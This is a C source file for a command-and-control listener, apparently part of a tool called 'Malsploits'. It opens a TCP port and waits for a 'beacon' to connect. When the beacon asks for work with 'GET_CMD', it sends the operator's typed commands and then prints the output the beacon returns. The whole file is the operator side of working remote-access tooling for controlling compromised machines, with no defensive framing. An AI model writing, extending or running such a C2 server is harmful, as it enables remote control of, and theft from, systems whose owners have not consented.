#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 8192
#define GREEN "\e[1;32m"
#define CYAN "\e[1;36m"
#define RED "\e[1;31m"
#define PURPLE "\e[1;35m"
#define RESET "\033[0m"

int server_fd, new_socket;
char command[BUFFER_SIZE];
ssize_t received;
struct sockaddr_in address;
int opt = 1;
socklen_t addrlen = sizeof(address);
char buffer[BUFFER_SIZE] = { 0 };
char stored_command[BUFFER_SIZE] = { 0 };

//Catch Ctrl+C
static volatile int keepRunning = 1;

void intHandler(int dummy) {
    keepRunning = 0;
}

int main(int argc, char const* argv[]) {
    unsigned short PORT = (unsigned short)atoi(argv[1]);

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Failed to initialize socket");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("Failed to attach socket to port");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Forcefully attaching socket to the port
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Failed to bind socket to port");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) < 0) {
        perror("Failed to listen");
        exit(EXIT_FAILURE);
    }

    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, &addrlen)) < 0) {
        perror("Failed to accept connection");
        exit(EXIT_FAILURE);
    }

    //Listens for commands sent from client, executes them, and sends the output back
    while(keepRunning) {

        printf(CYAN "Malsploits> " RESET);
        if (fgets(command, BUFFER_SIZE, stdin) == NULL) {
            printf("Invalid Command");
            break;
        }

        strncpy(stored_command, command, BUFFER_SIZE);
        printf(PURPLE "Command in queue: %s" RESET, command);

        memset(buffer, 0, BUFFER_SIZE);
        received = read(new_socket, buffer, BUFFER_SIZE - 1);

        if (strcmp(buffer, "GET_CMD") == 0) {
            if (strlen(stored_command) > 0) {
                send(new_socket, stored_command, strlen(stored_command), 0);
            } else {
                send(new_socket, "NO_CMD", 6, 0);
            }
        } 

        memset(buffer, 0, BUFFER_SIZE);
        received = read(new_socket, buffer, BUFFER_SIZE - 1);
        printf("%s", buffer);

        if (received <= 0) {
            printf("Beacon died or something went wrong...");
            break;
        }
        
    }

    // closing the connected socket
    close(new_socket);
  
    // closing the listening socket
    close(server_fd);
    return 0;
}
